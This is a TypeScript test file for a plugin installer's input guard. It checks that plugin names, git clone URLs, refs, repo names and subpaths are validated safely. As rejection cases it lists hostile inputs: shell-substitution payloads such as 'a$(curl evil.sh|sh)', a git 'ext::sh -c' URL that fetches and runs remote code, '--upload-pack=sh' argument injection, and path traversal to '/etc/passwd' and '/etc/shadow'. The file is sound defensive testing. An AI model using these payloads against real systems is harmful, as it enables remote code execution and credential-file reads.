import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { join, normalize } from 'path';
import {
  sanitizePluginName,
  resolveInstallDir,
  validateCloneUrl,
  validateRef,
  validateRepo,
  validateSubpath,
  resolveSource,
  buildCloneArgs,
  OFFICIAL_PLUGINS_REPO,
} from './install-guard';

const PLUGINS = '/home/u/.claude/plugins';

describe('sanitizePluginName', () => {
  it('accepts ordinary names', () => {
    for (const n of ['github-mcp', 'my_plugin', 'a.b-c_1', 'X9']) {
      expect(sanitizePluginName(n)).toEqual({ ok: true, value: n });
    }
  });

  it('rejects path traversal', () => {
    for (const n of ['../../.ssh', '..', '.', './x', 'a/b', '/etc/passwd', 'a\\b']) {
      expect(sanitizePluginName(n).ok, n).toBe(false);
    }
  });

  it('rejects the shell-substitution payloads that used to execute', () => {
    // $(...) inside the double quotes JSON.stringify produced was expanded by sh
    for (const n of ['$(id)', '`id`', 'a$(curl evil.sh|sh)', 'a;id', 'a|id', 'a&&id', '${HOME}']) {
      expect(sanitizePluginName(n).ok, n).toBe(false);
    }
  });

  it('rejects hidden names, empties and overlong names', () => {
    expect(sanitizePluginName('.hidden').ok).toBe(false);
    expect(sanitizePluginName('-flag').ok).toBe(false);
    expect(sanitizePluginName('').ok).toBe(false);
    expect(sanitizePluginName('a'.repeat(65)).ok).toBe(false);
    expect(sanitizePluginName(undefined).ok).toBe(false);
    expect(sanitizePluginName(123).ok).toBe(false);
  });

  it('property: an accepted name is always a single safe segment', () => {
    fc.assert(
      fc.property(fc.string(), (name) => {
        const r = sanitizePluginName(name);
        if (!r.ok) return;
        expect(r.value).not.toContain('/');
        expect(r.value).not.toContain('\\');
        expect(normalize(join(PLUGINS, r.value)).startsWith(`${PLUGINS}/`)).toBe(true);
      }),
      { numRuns: 500 },
    );
  });
});

describe('resolveInstallDir', () => {
  it('resolves an immediate child', () => {
    expect(resolveInstallDir(PLUGINS, 'x')).toEqual({ ok: true, value: `${PLUGINS}/x` });
  });

  it('refuses anything that escapes or nests, independent of the name charset', () => {
    // second line of defence: if the charset rule were loosened, this still holds
    for (const n of ['../evil', 'a/b', '../../etc']) {
      expect(resolveInstallDir(PLUGINS, n).ok, n).toBe(false);
    }
  });
});

describe('validateCloneUrl — git transports that execute', () => {
  it('accepts https', () => {
    expect(validateCloneUrl('https://github.com/o/r.git')).toEqual({
      ok: true,
      value: 'https://github.com/o/r.git',
    });
  });

  it('refuses ext:: (arbitrary command execution by git)', () => {
    expect(validateCloneUrl('ext::sh -c "curl evil.sh|sh"').ok).toBe(false);
  });

  it('refuses local and non-https transports', () => {
    for (const u of [
      'file:///tmp/evil',
      'git://evil.example/r',
      'ssh://git@evil.example/r',
      '/tmp/local-repo',
      '../relative',
      'git@github.com:o/r.git',
      'http://github.com/o/r.git',
    ]) {
      expect(validateCloneUrl(u).ok, u).toBe(false);
    }
  });

  it('refuses embedded credentials', () => {
    expect(validateCloneUrl('https://user:pw@github.com/o/r.git').ok).toBe(false);
  });
});

describe('validateRef', () => {
  it('accepts refs and allows omission', () => {
    expect(validateRef('main')).toEqual({ ok: true, value: 'main' });
    expect(validateRef('release/1.2.3')).toEqual({ ok: true, value: 'release/1.2.3' });
    expect(validateRef(undefined)).toEqual({ ok: true, value: undefined });
    expect(validateRef('')).toEqual({ ok: true, value: undefined });
  });

  it('refuses a ref that git would read as an option', () => {
    // `--branch --upload-pack=…` style argument injection
    for (const r of ['--upload-pack=sh', '-x', '--config=core.sshCommand=sh']) {
      expect(validateRef(r).ok, r).toBe(false);
    }
  });

  it('refuses shell metacharacters and ref traversal', () => {
    for (const r of ['a;id', '$(id)', 'a..b', 'a b', 'a\nb']) {
      expect(validateRef(r).ok, r).toBe(false);
    }
  });
});

describe('validateRepo', () => {
  it('accepts owner/name and strips .git', () => {
    expect(validateRepo('anthropics/claude-code')).toEqual({ ok: true, value: 'anthropics/claude-code' });
    expect(validateRepo('o/r.git')).toEqual({ ok: true, value: 'o/r' });
  });

  it('refuses anything that would change the resulting URL', () => {
    for (const r of ['o/r/../../evil', 'o', '../o/r', 'o/r?x=1', 'o/r#f', 'o r', '/o/r', 'o//r']) {
      expect(validateRepo(r).ok, r).toBe(false);
    }
  });
});

describe('validateSubpath', () => {
  it('accepts relative paths and strips a leading ./', () => {
    expect(validateSubpath('plugins/gh')).toEqual({ ok: true, value: 'plugins/gh' });
    expect(validateSubpath('./plugins/gh')).toEqual({ ok: true, value: 'plugins/gh' });
  });

  it('refuses traversal out of the clone', () => {
    for (const p of ['../../../etc', '..', 'a/../../b', '/abs/path']) {
      expect(validateSubpath(p).ok, p).toBe(false);
    }
  });

  it('treats . and empty as no subpath', () => {
    expect(validateSubpath('.')).toEqual({ ok: true, value: undefined });
    expect(validateSubpath('')).toEqual({ ok: true, value: undefined });
  });

  it('property: an accepted subpath always stays inside the base', () => {
    fc.assert(
      fc.property(fc.string(), (p) => {
        const r = validateSubpath(p);
        if (!r.ok || !r.value) return;
        expect(normalize(join('/base', r.value)).startsWith('/base/')).toBe(true);
      }),
      { numRuns: 500 },
    );
  });
});

describe('resolveSource', () => {
  it('maps a bare string into the official repo as a subpath', () => {
    expect(resolveSource('./plugins/gh')).toEqual({
      ok: true,
      value: { cloneUrl: OFFICIAL_PLUGINS_REPO, subpath: 'plugins/gh' },
    });
  });

  it('refuses a string that traverses', () => {
    expect(resolveSource('../../../etc/shadow').ok).toBe(false);
  });

  it('handles url, github and git-subdir shapes', () => {
    expect(resolveSource({ source: 'url', url: 'https://h/r.git', ref: 'main' })).toEqual({
      ok: true,
      value: { cloneUrl: 'https://h/r.git', ref: 'main' },
    });
    expect(resolveSource({ source: 'github', repo: 'o/r' })).toEqual({
      ok: true,
      value: { cloneUrl: 'https://github.com/o/r.git', ref: undefined },
    });
    expect(resolveSource({ source: 'git-subdir', url: 'https://h/r.git', path: 'sub/dir' })).toEqual({
      ok: true,
      value: { cloneUrl: 'https://h/r.git', ref: undefined, subpath: 'sub/dir' },
    });
  });

  it('fails closed on unknown or malformed shapes', () => {
    for (const s of [
      { source: 'exec', url: 'https://h/r' },
      { source: 'url' },
      { source: 'url', url: 'ext::sh -c id' },
      { source: 'github', repo: '../../evil' },
      {},
      null,
      42,
    ]) {
      expect(resolveSource(s as never).ok, JSON.stringify(s)).toBe(false);
    }
  });
});

describe('buildCloneArgs', () => {
  it('passes a ref as its own argv element and terminates options', () => {
    expect(buildCloneArgs({ cloneUrl: 'https://h/r.git', ref: 'main' }, '/t/d')).toEqual([
      'clone',
      '--depth',
      '1',
      '--single-branch',
      '--branch',
      'main',
      '--',
      'https://h/r.git',
      '/t/d',
    ]);
  });

  it('omits --branch when there is no ref', () => {
    expect(buildCloneArgs({ cloneUrl: 'https://h/r.git' }, '/t/d')).toEqual([
      'clone',
      '--depth',
      '1',
      '--single-branch',
      '--',
      'https://h/r.git',
      '/t/d',
    ]);
  });

  it('never produces a single command string (no shell surface)', () => {
    const args = buildCloneArgs({ cloneUrl: 'https://h/r.git', ref: 'v1' }, '/t/d');
    // every element is a discrete argv entry — no spaces smuggling extra args
    expect(args.filter((a) => a.includes(' '))).toEqual([]);
  });
});
